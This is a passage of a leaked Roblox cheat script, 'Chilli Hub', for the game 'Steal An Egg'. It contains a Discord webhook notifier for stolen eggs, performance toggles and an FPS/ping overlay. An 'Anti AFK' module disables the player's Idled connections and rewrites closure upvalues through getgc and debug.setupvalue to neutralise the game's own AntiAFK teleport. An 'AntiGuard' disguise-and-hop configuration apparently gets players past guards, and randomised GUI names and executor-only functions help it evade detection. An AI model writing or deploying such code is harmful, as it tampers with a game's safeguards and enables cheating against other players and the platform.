			local value561 = obj105:ReadPixelsBuffer(Vector2.zero, size)

			pcall(function()
				obj105:Destroy()
			end)

			local n15 = math.min(1, tbl498.MaxSide / math.max(n13, n14))
			local n16 = math.max(1, math.floor(n13 * n15))
			local n17 = math.max(1, math.floor(n14 * n15))
			local arr6 = buffer.create(n16 * n17 * 4)

			for i = 0, n17 - 1 do
				local n18 = math.min(n14 - 1, math.floor(i / n15))

				for i2 = 0, n16 - 1 do
					buffer.copy(arr6, (i * n16 + i2) * 4, value561, (n18 * n13 + math.min(n13 - 1, math.floor(i2 / n15))) * 4, 4)
				end
			end

			return func674(arr6, n16, n17)
		end)

		tbl498.Pngs[str69] = ok and type(result) == "string" and result or false
		return tbl498.Pngs[str69] or nil
	end

	local function func679(param401, param402)
		if param402 then
			return 13686498
		end

		if typeof(param401) ~= "Color3" then
			return 5793266
		end
		return math.floor(param401.R * 255 + 0.5) * 65536 + math.floor(param401.G * 255 + 0.5) * 256 + math.floor(param401.B * 255 + 0.5)
	end

	local function func680(list75)
		local list76 = {}

		if type(list75) == "table" then
			for _, item181 in ipairs(list75) do
				list76[#list76 + 1] = func7(item181)
			end
		end

		return #list76 > 0 and table.concat(list76, ", ") or "None"
	end

	local function func681(flag652)
		local areas = tbl1.Areas
		local directory = type(areas) == "table" and (areas.Directory or areas) or nil
		local str70 = tostring(flag652 or "")
		local flag653 = type(directory) == "table" and str70 ~= "" and directory[str70] or nil
		if type(flag653) == "table" then
			return tostring(flag653.DisplayName or str70)
		end
		return str70 ~= "" and str70 or "Field"
	end

	local function func682(param403, param404, param405, flag654, param406, param407)
		local str71 = tostring(param404)
		local value562 = str39.AssetInfo(str71)
		local n13 = tonumber(param405) or 1
		local tbl499 = type(flag654) == "table" and flag654 or {}
		local value563 = str39.Income(value562, n13, tbl499)
		local dot = tbl498.Dot
		local formatted21 = string.format("x%.2f", n13)
		local eggRecords = tbl1.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
			local ok, result = pcall(eggRecords.WeightKgForScale, str71, n13)

			if ok and tonumber(result) then
				formatted21 ..= dot .. str39.FormatWeight(result)
			end
		end

		local emoji = tbl498.Emoji
		local str72 = "**" .. tostring(value562.Name) .. "**" .. dot .. tostring(value562.Rarity)
		local str73 = emoji.Value .. " **Value:** $" .. str39.FormatRate(value563)
		local str74 = emoji.Size .. " **Size:** " .. formatted21
		local str75 = emoji.Mutation .. " **Mutation:** " .. func680(tbl499)
		local str76 = emoji.Area .. " **Area:** " .. func681(param406)
		local tbl500 = { str72, str73, str74, str75, str76 }

		local tbl501 = {
			author = { name = localPlayer.DisplayName, icon_url = func672() },
			title = param403,
			description = table.concat(tbl500, "\n"),
			color = func679(value562.Color, string.upper(tostring(value562.Rarity)) == "SECRET"),
			footer = { text = "Chilli Hub leaked by CCPS" .. dot .. "Steal An Egg", icon_url = tbl498.Logo },
			timestamp = DateTime.now():ToIsoDate(),
		}

		local tbl502 = { username = "Chilli Hub leaked by CCPS", avatar_url = tbl498.Logo, embeds = { tbl501 } }
		local icon = value562.Icon

		if param407 then
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local flag655 = type(directory) == "table" and directory[str71] or nil
			local egg = type(flag655) == "table" and type(flag655.Egg) == "table" and flag655.Egg or nil

			if egg and egg.Icon ~= nil then
				icon = egg.Icon
			end
		end

		local num150 = tonumber(string.match(tostring(icon or ""), "(%d+)"))
		local flag656 = num150 and func678(num150) or nil
		local flag657 = num150 and not flag656 and func671(num150) or nil

		if flag656 then
			tbl501.thumbnail = { url = "attachment://egg.png" }
			tbl502.attachments = { { id = 0, filename = "egg.png" } }
		elseif flag657 then
			tbl501.thumbnail = { url = flag657 }
		end

		return tbl502, flag656
	end

	local function func683()
		if tbl498.Sending then
			return
		end
		tbl498.Sending = true

		task.spawn(function()
			while #tbl498.Queue > 0 and not tbl498.Disposed do
				local value564 = table.remove(tbl498.Queue, 1)

				if func668(tbl498.Url) and type(request_) == "function" then
					local tbl503 = { Url = tbl498.Url, Method = "POST" }

					if value564.Png then
						local str77 = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
						tbl503.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str77 }
						local concat = table.concat
						local png = value564.Png
						local json = HttpService:JSONEncode(value564.Payload)
						local tbl504 = {
							"--",
							str77,
							"\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							json,
							"\r\n",
							"--",
							str77,
							"\r\n",
							"Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n",
							"Content-Type: image/png\r\n\r\n",
							png,
							"\r\n",
							"--",
							str77,
							"--\r\n",
						}
						tbl503.Body = concat(tbl504)
					else
						tbl503.Headers = { ["Content-Type"] = "application/json" }
						tbl503.Body = HttpService:JSONEncode(value564.Payload)
					end

					local ok, result = pcall(request_, tbl503)
					local flag658 = ok and type(result) == "table" and tonumber(result.StatusCode) or nil

					if flag658 == 429 and value564.Tries < 3 then
						value564.Tries = value564.Tries + 1
						table.insert(tbl498.Queue, 1, value564)
						task.wait(3)
					elseif flag658 ~= 200 and flag658 ~= 204 and value564.Png then
						value564.Png = nil
						value564.Payload.attachments = nil
						local flag659 = type(value564.Payload.embeds) == "table" and value564.Payload.embeds[1] or nil

						if flag659 then
							flag659.thumbnail = nil
						end

						table.insert(tbl498.Queue, 1, value564)
					end
				end

				task.wait(1.2)
			end

			tbl498.Sending = false
		end)
	end

	local function func684()
		return type(request_) == "function" and func668(tbl498.Url)
	end

	local function func685(param408, param409)
		if #tbl498.Queue >= 20 then
			table.remove(tbl498.Queue, 1)
		end

		if tbl498.PingEveryone and type(param408) == "table" then
			param408.content = "@everyone"
			param408.allowed_mentions = { parse = { "everyone" } }
		end

		table.insert(tbl498.Queue, { Payload = param408, Png = param409, Tries = 0 })
		func683()
	end

	local eggState = tbl1.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(param410)
			if type(param410) ~= "table" then
				return
			end

			if param410.IsCarrying then
				tbl498.Carry = {
					Category = tostring(param410.AssetCategory),
					Uid = tostring(param410.Uid),
					Area = tostring(param410.AreaId or "Field"),
					EndedAt = nil,
				}
			elseif tbl498.Carry then
				tbl498.Carry.EndedAt = os.clock()
			end
		end)

		if ok and result then
			func4(function()
				pcall(function()
					result:Disconnect()
				end)
			end)
		end
	end

	func4(function()
		tbl498.Disposed = true
	end)

	task.spawn(function()
		while not tbl498.Disposed do
			local flag660 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
			local flag661 = false
			local result = nil

			if flag660 then
				flag661, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			end

			if flag661 and type(result) == "table" then
				local known = tbl498.Known
				local list77 = {}
				local known2 = {}

				for k, value565 in pairs(result) do
					local str78 = tostring(k)
					known2[str78] = true

					if known and not known[str78] and type(value565) == "table" then
						list77[#list77 + 1] = { Uid = str78, Record = value565 }
					end
				end

				tbl498.Known = known2
				local carry = tbl498.Carry

				if tbl498.Stolen and carry and #list77 > 0 then
					for _, item182 in ipairs(list77) do
						local record = item182.Record
						local endedAt2 = carry.EndedAt == nil

						if not endedAt2 then
							local endedAt = carry.EndedAt
							endedAt2 = os.clock() - endedAt < 20
						end

						if endedAt2 then
							endedAt2 = item182.Uid == carry.Uid

							if not endedAt2 then
								local category = carry.Category
								endedAt2 = tostring(record.AssetCategory) == category
							end
						end

						if endedAt2 then
							tbl498.Carry = nil
							local mutations = type(record.Mutations) == "table" and record.Mutations or {}

							task.spawn(function()
								if func684() then
									func685(func682("Egg Stolen!", record.AssetCategory, record.AssetScale, mutations, carry.Area))
								end
							end)

							break
						end
					end
				end
			end

			task.wait(1.5)
		end
	end)

	local function func686(param411)
		local input = tbl498.Input
		if type(input) ~= "table" then
			return
		end

		for _, item183 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return input[item183]
			end)

			if ok and type(result) == "function" and pcall(result, input, param411, false) then
				return
			end
		end
	end

	tbl498.Input = obj77:CreateInput({
		Name = "Webhook URL",
		Placeholder = "https://discord.com/api/webhooks/...",
		Default = tbl498.Saved,
		MaxLength = 256,
		Callback = function(value)
			local cleaned5 = string.gsub(tostring(value or ""), "%s", "")
			local flag662 = cleaned5 == "" and tbl498.Saved ~= ""
			local flag663

			if flag662 then
				local loadedAt = tbl498.LoadedAt
				flag663 = os.clock() - loadedAt < 5
			else
				flag663 = flag662
			end

			if flag663 then
				tbl498.Url = tbl498.Saved
				task.defer(func686, tbl498.Saved)
				return
			end

			tbl498.Url = cleaned5

			if (cleaned5 == "" or func668(cleaned5)) and cleaned5 ~= tbl498.Saved and type(writefile) == "function" then
				if pcall(writefile, tbl498.Path, cleaned5) then
					tbl498.Saved = cleaned5
				end
			end
		end,
	})

	obj77:CreateToggle({
		Name = "Ping @everyone",
		Default = false,
		Callback = function(value)
			tbl498.PingEveryone = value == true
		end,
	})

	obj77:CreateToggle({
		Name = "Notify Stolen Eggs",
		Note = "Post every egg you bring home",
		Default = false,
		Callback = function(value)
			tbl498.Stolen = value == true
		end,
	})
end

local obj106
obj106 = obj2:CreateTab({ Name = "Misc", SectionsExpanded = true })
local obj107
obj107 = obj106:CreateSection({ Name = "Performance", Expanded = true })
local flag664 = false

obj107:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Callback = function(value)
		local n13 = math.clamp(math.floor(tonumber(value) or 240), 30, 1000)
		if type(setfpscap) == "function" and pcall(setfpscap, n13) then
			flag664 = false
			return
		end

		if not flag664 then
			flag664 = true
			func651("FPS Cap Unavailable", "This environment does not support setfpscap.")
		end
	end,
})

do
	local Lighting = game:GetService("Lighting")
	local n13 = 0.003
	local flag665 = false
	local n14 = 0
	local thread = nil
	local list78 = {}
	local list79 = {}
	local obj = setmetatable({}, { __mode = "k" })
	local list80 = {}
	local connection = nil

	local function func687(param412, param413, param414)
		local ok, result = pcall(param412)
		if not ok then
			return
		end
		list79[#list79 + 1] = { Setter = param413, Value = result }
		pcall(param413, param414)
	end

	local function func688(tbl505, param415, param416)
		local entry53 = obj[tbl505]

		if not entry53 then
			entry53 = {}
			obj[tbl505] = entry53
		end

		if entry53[param415] == nil then
			local ok, result = pcall(function()
				return tbl505[param415]
			end)

			if not ok then
				return
			end
			entry53[param415] = { Value = result }
		end

		pcall(function()
			tbl505[param415] = param416
		end)
	end

	local function func689(instance29)
		if not flag665 or not instance29.Parent then
			return
		end

		if instance29:IsA("ParticleEmitter") then
			func688(instance29, "Enabled", false)
			func688(instance29, "Rate", 0)
		elseif instance29:IsA("Trail") or instance29:IsA("Beam") then
			func688(instance29, "Enabled", false)
		elseif instance29:IsA("PointLight") or instance29:IsA("SpotLight") or instance29:IsA("SurfaceLight") then
			func688(instance29, "Enabled", false)
			func688(instance29, "Brightness", 0)
		elseif instance29:IsA("Fire") or instance29:IsA("Smoke") or instance29:IsA("Sparkles") then
			func688(instance29, "Enabled", false)
		elseif instance29:IsA("Explosion") then
			func688(instance29, "Visible", false)
		elseif instance29:IsA("SpecialMesh") then
			func688(instance29, "TextureId", "")
		elseif instance29:IsA("Decal") or instance29:IsA("Texture") then
			if not (instance29.Name == "face" and instance29.Parent and instance29.Parent.Name == "Head") then
				func688(instance29, "Transparency", 1)
			end
		elseif instance29:IsA("MeshPart") then
			func688(instance29, "RenderFidelity", Enum.RenderFidelity.Performance)
			func688(instance29, "TextureID", "")
			func688(instance29, "CastShadow", false)
			func688(instance29, "Reflectance", 0)
			func688(instance29, "Material", Enum.Material.SmoothPlastic)
		elseif instance29:IsA("BasePart") then
			func688(instance29, "CastShadow", false)
			func688(instance29, "Reflectance", 0)
			func688(instance29, "Material", Enum.Material.SmoothPlastic)
		elseif instance29:IsA("PostEffect") then
			func688(instance29, "Enabled", false)
		elseif instance29:IsA("Clouds") then
			func688(instance29, "Cover", 0)
			func688(instance29, "Density", 0)
		elseif instance29:IsA("Atmosphere") then
			func688(instance29, "Density", 0)
			func688(instance29, "Haze", 0)
			func688(instance29, "Glare", 0)
		end
	end

	local function func690()
		for _, item184 in ipairs(list78) do
			if item184.Connected then
				item184:Disconnect()
			end
		end

		table.clear(list78)

		if connection then
			pcall(function()
				connection:Disconnect()
			end)

			connection = nil
		end
	end

	local function func691()
		local rendering = settings().Rendering
		local terrain = workspace.Terrain

		local function func692(tbl506, param417, param418)
			func687(function()
				return tbl506[param417]
			end, function(param419)
				tbl506[param417] = param419
			end, param418)
		end

		func692(rendering, "QualityLevel", Enum.QualityLevel.Level01)
		func692(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
		func692(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)

		local ok, result = pcall(function()
			return UserSettings():GetService("UserGameSettings")
		end)

		if ok and result then
			func692(result, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
		end

		func692(Lighting, "GlobalShadows", false)
		func692(Lighting, "ShadowSoftness", 0)
		func692(Lighting, "FogEnd", 9e9)
		func692(Lighting, "Technology", Enum.Technology.Legacy)
		func692(Lighting, "EnvironmentDiffuseScale", 0)
		func692(Lighting, "EnvironmentSpecularScale", 0)
		func692(terrain, "Decoration", false)
		func692(terrain, "WaterWaveSize", 0)
		func692(terrain, "WaterWaveSpeed", 0)
		func692(terrain, "WaterReflectance", 0)
		func692(terrain, "WaterTransparency", 1)
	end

	local function func693(list81, param420)
		local now = os.clock()

		for _, descendant in ipairs(list81:GetDescendants()) do
			if not flag665 or n14 ~= param420 then
				return false
			end
			func689(descendant)

			if os.clock() - now > n13 then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end

		return true
	end

	local function func694()
		if not flag665 or #list80 == 0 then
			return
		end
		local now = os.clock()

		while #list80 > 0 do
			local value566 = table.remove(list80)
			func689(value566)
			if not (n13 < os.clock() - now) then
				continue
			end
			break
		end
	end

	local function func695()
		local now = os.clock()

		for k, value567 in pairs(obj) do
			if k.Parent then
				for k2, value568 in pairs(value567) do
					pcall(function()
						k[k2] = value568.Value
					end)
				end
			end

			obj[k] = nil

			if n13 < os.clock() - now then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end
	end

	local function func696()
		if not flag665 then
			return
		end
		flag665 = false
		n14 += 1
		func690()
		table.clear(list80)

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		func695()

		for i = #list79, 1, -1 do
			local entry54 = list79[i]
			pcall(entry54.Setter, entry54.Value)
		end

		table.clear(list79)
	end

	local function func697()
		if flag665 then
			return
		end
		flag665 = true
		n14 += 1
		local value569 = n14
		func691()

		local function func698(param421)
			list78[#list78 + 1] = param421.DescendantAdded:Connect(function(descendant)
				if flag665 and n14 == value569 then
					list80[#list80 + 1] = descendant
				end
			end)
		end

		func698(workspace)
		func698(Lighting)

		connection = RunService.Heartbeat:Connect(function()
			if flag665 and n14 == value569 then
				func694()
			end
		end)

		thread = task.spawn(function()
			if func693(workspace, value569) then
				func693(Lighting, value569)
			end
		end)
	end

	func4(func696)

	obj107:CreateToggle({
		Name = "Optimizer",
		Note = "Strip shadows, textures and effects for the highest FPS",
		Default = false,
		Callback = function(value)
			if value then
				func697()
			else
				task.spawn(func696)
			end
		end,
	})
end

do
	local Stats = game:GetService("Stats")
	local n13 = 132
	local n14 = 0.085
	local n15 = 0.2
	local n16 = 8
	local obj108 = obj2:CreateState({ Name = "FPS and Ping Position", Default = {} })

	local function func699()
		local value570 = obj108:Get()
		if type(value570) == "table" and type(value570.XOffset) == "number" and type(value570.YOffset) == "number" then
			return UDim2.new(tonumber(value570.XScale) or 0, value570.XOffset, tonumber(value570.YScale) or 0, value570.YOffset)
		end
		return UDim2.new(0, 16, 0, 16)
	end

	local function func700(param422)
		obj108:Set({ XScale = param422.X.Scale, XOffset = param422.X.Offset, YScale = param422.Y.Scale, YOffset = param422.Y.Offset })
	end

	local color3 = Color3.fromRGB(58, 255, 55)
	local color4 = Color3.fromRGB(255, 214, 84)
	local color5 = Color3.fromRGB(255, 96, 96)
	local color6 = Color3.fromRGB(150, 150, 158)
	local flag666 = false
	local list82 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil
	local value571 = nil
	local value572 = nil
	local n17 = 1
	local n18 = 0
	local n19 = 0
	local value573 = nil
	local value574 = nil
	local font = nil

	pcall(function()
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function func701(param423)
		if param423 >= 100 then
			return color3
		end

		if param423 >= 50 then
			return color4
		end
		return color5
	end

	local function func702(param424)
		if param424 <= 90 then
			return color3
		end

		if param424 <= 180 then
			return color4
		end
		return color5
	end

	local function func703()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n14 / n13, 0.7, 1.4) * n17
	end

	local function func704()
		for _, item185 in ipairs(list82) do
			pcall(function()
				item185:Disconnect()
			end)
		end

		table.clear(list82)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		frame = nil
		uiScale = nil
		value571 = nil
		value572 = nil
		value573 = nil
		value574 = nil
		n18 = 0
	end

	local function createTextLabel(parent, param425, param426, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = func3()
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(param425, 9)
		textLabel.Size = UDim2.fromOffset(param426, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		if font then
			textLabel.FontFace = font
		else
			textLabel.Font = Enum.Font.GothamBold
		end

		textLabel.Parent = parent
		return textLabel
	end

	local function func705()
		func704()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = func3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		frame = Instance.new("Frame")
		frame.Name = func3()
		frame.Active = true
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = func699()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = func3()
		uiCorner.CornerRadius = UDim.new(0, 12)
		uiCorner.Parent = frame
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = func3()
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Name = func3()
		uiScale.Parent = frame
		func703()
		value571 = createTextLabel(frame, 12, 34, color3)
		createTextLabel(frame, 48, 22, color6).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.Name = func3()
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		value572 = createTextLabel(frame, 82, 30, color3)
		createTextLabel(frame, 113, 14, color6).Text = "ms"
		screenGui.Parent = value1
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			list82[#list82 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func703)
		end

		local flag667 = false
		local value575 = nil
		local vector2 = Vector2.zero
		local position = nil

		list82[#list82 + 1] = frame.InputBegan:Connect(function(input)
			if flag667 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			local userInputType2 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not userInputType2 then
				return
			end
			flag667 = true
			value575 = userInputType2 and input or nil
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
		end)

		list82[#list82 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag667 or not frame or not position then
				return
			end

			if not (value575 and input == value575 or not value575 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return
			end
			local n20 = Vector2.new(input.Position.X, input.Position.Y) - vector2
			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n20.X, position.Y.Scale, position.Y.Offset + n20.Y)
		end)

		list82[#list82 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag667 then
				return
			end

			if value575 and input == value575 or not value575 and input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag667 = false
				value575 = nil
				position = nil

				if frame then
					func700(frame.Position)
				end
			end
		end)

		list82[#list82 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag666 or not value571 then
				return
			end
			local n20 = math.clamp(deltaTime, 0.001, 1)
			local n21 = 1 / n20

			if n18 <= 0 then
				n18 = n21
			else
				n18 += (n21 - n18) * (1 - math.exp(-n20 * n16))
			end

			local now = os.clock()
			if now < n19 then
				return
			end
			n19 = now + n15
			local n22 = math.floor(n18 + 0.5)
			local text = tostring(n22)

			if text ~= value573 then
				value573 = text
				value571.Text = text
				value571.TextColor3 = func701(n22)
			end

			local n23 = 0

			pcall(function()
				n23 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local n24 = math.floor(n23 + 0.5)
			local text2 = tostring(n24)

			if text2 ~= value574 then
				value574 = text2
				value572.Text = text2
				value572.TextColor3 = func702(n24)
			end
		end)
	end

	obj107:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		SubOf = obj107:CreateToggle({
			Name = "FPS and Ping",
			Default = true,
			Callback = function(value)
				flag666 = value == true

				if flag666 then
					func705()
				else
					func704()
				end
			end,
		}),
		Callback = function(value)
			n17 = math.clamp((tonumber(value) or 100) / 100, 0.6, 1.6)
			func703()
		end,
	})

	func4(func704)
end

do
	local flag668 = false
	local value576 = nil

	local function func706(flag669)
		if value576 then
			pcall(function()
				value576:Destroy()
			end)

			value576 = nil
		end

		str1.RenderBackdrop = nil
		if not flag669 then
			return
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = func3()
		screenGui.DisplayOrder = -1000
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		local frame = Instance.new("Frame")
		frame.Name = func3()
		frame.BackgroundColor3 = Color3.new(0, 0, 0)
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, 1)
		frame.Parent = screenGui
		str1.RenderBackdrop = screenGui
		screenGui.Parent = playerGui
		value576 = screenGui
	end

	local function func707(flag670)
		pcall(function()
			RunService:Set3dRenderingEnabled(flag670)
		end)

		pcall(func706, not flag670)
	end

	obj107:CreateToggle({
		Name = "Disable 3D Render",
		Default = false,
		Callback = function(value)
			flag668 = value == true
			func707(not flag668)
		end,
	})

	func4(function()
		if flag668 then
			func707(true)
		end
	end)
end

do
	local obj109 = obj106:CreateSection({ Name = "Utility", Expanded = true })
	local tbl507 = { Enabled = true, Alive = true, Silenced = {} }

	local function func708()
		if type(getconnections) ~= "function" then
			return {}
		end
		local ok, result = pcall(getconnections, localPlayer.Idled)
		return ok and type(result) == "table" and result or {}
	end

	local function func709()
		for _, item186 in ipairs(func708()) do
			if pcall(function()
				item186:Disable()
			end) then
				tbl507.Silenced[#tbl507.Silenced + 1] = item186
			end
		end
	end

	local function func710()
		local silenced = tbl507.Silenced

		if #silenced == 0 then
			silenced = func708()
		end

		for _, item187 in ipairs(silenced) do
			pcall(function()
				item187:Enable()
			end)
		end

		table.clear(tbl507.Silenced)
	end

	local obj = setmetatable({}, { __index = function()
		return function()
		end
	end })

	local list83 = {}

	local function func711()
		local list84 = {}
		if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
			return list84
		end
		local ok, result = pcall(getgc, false)
		if not ok or type(result) ~= "table" then
			return list84
		end

		for _, item188 in ipairs(result) do
			if type(item188) == "function" and islclosure(item188) then
				local ok2, result2 = pcall(debug.info, item188, "s")

				if ok2 and type(result2) == "string" and string.find(result2, "AntiAFK", 1, true) then
					local ok3, result3 = pcall(debug.getupvalues, item188)

					if ok3 and type(result3) == "table" then
						for k, value577 in pairs(result3) do
							if typeof(value577) == "Instance" and value577.ClassName == "TeleportService" then
								list84[#list84 + 1] = { Fn = item188, Index = k, Original = value577 }
							end
						end
					end
				end
			end
		end

		return list84
	end

	local function func712()
		for _, item189 in ipairs(func711()) do
			local ok, result = pcall(debug.getupvalue, item189.Fn, item189.Index)

			if ok and typeof(result) == "Instance" then
				if pcall(debug.setupvalue, item189.Fn, item189.Index, obj) then
					list83[#list83 + 1] = item189
				end
			end
		end
	end

	local function func713()
		for _, item190 in ipairs(list83) do
			pcall(debug.setupvalue, item190.Fn, item190.Index, item190.Original)
		end

		table.clear(list83)
	end

	local function func714()
		func709()

		if #list83 == 0 then
			func712()
		end
	end

	local connection = localPlayer.CharacterAdded:Connect(function()
		task.delay(1, function()
			if tbl507.Alive and tbl507.Enabled then
				table.clear(tbl507.Silenced)
				pcall(func714)
			end
		end)
	end)

	func4(function()
		pcall(function()
			connection:Disconnect()
		end)
	end)

	func4(function()
		tbl507.Alive = false
		func710()
		func713()
	end)

	task.spawn(function()
		while tbl507.Alive do
			if tbl507.Enabled then
				func714()
			end

			task.wait(600)
		end
	end)

	obj109:CreateToggle({
		Name = "Anti AFK",
		Default = true,
		Callback = function(value)
			tbl507.Enabled = value ~= false

			if tbl507.Enabled then
				func714()
			else
				func710()
				func713()
			end
		end,
	})
end

local GuiService2, StarterGui, antiGuard, tbl508, chilliAntiGuard, tbl509, tbl510, n13, flag671, list85
local flag672, func715, hui, func716, ScreenGui, Frame, UIScale, Frame2, UIScale2, UIGradient
local func717

do
	local TweenService = game:GetService("TweenService")
	GuiService2 = game:GetService("GuiService")
	StarterGui = game:GetService("StarterGui")
	antiGuard = str1.AntiGuard

	tbl508 = {
		Target = "line",
		LineOffset = 8,
		Height = 45,
		OffsetX = -90,
		OffsetZ = -35,
		Jitter = 0,
		Point = false,
		Disguise = true,
		Limp = true,
		Facing = "Zero",
		Freeze = false,
		StartAt = 0,
		Steps = {
			{ At = 0.1, To = "home" },
			{ At = 0.33, To = "home" },
			{ At = 0.56, To = "home" },
			{ At = 0.75, To = "start" },
		},
		ReleaseAt = 0.8,
		WeldScanGap = 0.03,
		BusyLimit = 2.5,
	}

	local function func718(param427, num151, num152, param428, param429, param430)
		local list86 = {}

		for i = 1, param427 do
			list86[#list86 + 1] = { At = num151 + num152 * (i - 1), To = "home" }
		end

		list86[#list86 + 1] = { At = param428, To = "start" }

		return {
			Target = "home",
			LineOffset = 8,
			Height = 0,
			OffsetX = 0,
			OffsetZ = 0,
			Jitter = 0,
			Point = false,
			Disguise = true,
			Limp = false,
			Facing = "Zero",
			Freeze = true,
			StartAt = 0,
			StartRandom = 0,
			HopRandom = 0.085,
			HoldRandom = 0.395,
			Steps = list86,
			ReleaseAt = param429,
			WeldScanGap = 0.03,
			BusyLimit = param430,
		}
	end

	chilliAntiGuard = { LightDark = tbl508, Default = func718(25, 0, 0.05, 1.27, 1.52, 2.5) }

	pcall(function()
		getgenv().ChilliAntiGuard = chilliAntiGuard
	end)

	tbl509 = {
		Card = Color3.fromRGB(15, 15, 19),
		CardTop = Color3.fromRGB(24, 22, 28),
		Stroke = Color3.fromRGB(48, 46, 56),
		Text = Color3.fromRGB(240, 238, 244),
		AccentA = Color3.fromRGB(255, 72, 72),
		AccentB = Color3.fromRGB(255, 150, 60),
		Good = Color3.fromRGB(80, 220, 140),
		Work = Color3.fromRGB(255, 190, 70),
		Bad = Color3.fromRGB(240, 90, 90),
		Off = Color3.fromRGB(58, 56, 66),
	}
	-- https://discord.gg/x7YbZeezpm | 𝐒𝐋

	tbl510 = {
		{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
		{
			Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
		{
			Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
	}

	n13 = 52
	flag671 = true
	list85 = {}

	flag672 = {
		AreaId = nil,
		SignalCarrying = false,
		WeldCarrying = false,
		Carrying = false,
		Active = false,
		Disguise = nil,
		FlashRequest = nil,
		FlashUntil = 0,
	}

	func715 = function()
		local tbl511 = {}

		for i = 1, math.random(10, 16) do
			tbl511[i] = string.char(math.random(97, 122))
		end

		return table.concat(tbl511)
	end

	hui = nil

	pcall(function()
		hui = gethui()
	end)

	hui = hui or CoreGui

	local function func719(param431, parent, flag673)
		local instance = Instance.new(param431)
		instance.Name = func715()
		local func720 = pairs
		local tbl512 = flag673 or {}

		for k, value578 in func720(tbl512) do
			instance[k] = value578
		end

		instance.Parent = parent
		return instance
	end

	func716 = function(param432, param433, param434, flag674)
		local ok, result = pcall(function()
